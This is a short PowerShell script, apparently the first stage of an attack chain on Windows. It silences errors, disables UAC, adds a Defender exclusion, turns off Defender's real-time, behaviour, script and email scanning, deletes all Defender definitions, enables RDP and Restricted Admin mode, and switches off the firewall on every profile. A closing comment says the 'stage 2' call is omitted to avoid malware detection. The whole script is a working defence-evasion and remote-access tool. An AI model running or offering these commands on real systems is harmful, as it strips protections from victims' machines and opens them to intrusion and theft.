$ErrorActionPreference = 'silentlycontinue'

# disable UAC
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f  

Write-Host "[!] Disabling Defender"
mkdir C:\Folder1
Add-MpPreference -ExclusionPath C:\Folder1
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting Disable
Set-MpPreference -DisableIOAVProtection $true
Set-MPPreference -DisableBehaviorMonitoring $true
Set-MPPreference -DisableBlockAtFirstSeen $true
Set-MPPreference -DisableEmailScanning $true
Set-MPPReference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All


Write-Host "[!] Patching RDP Access"
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Write-Host "[!] Disabling Firewall"
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False


# Call stage 2
# we cant do this directly because the script will get flagged als malware
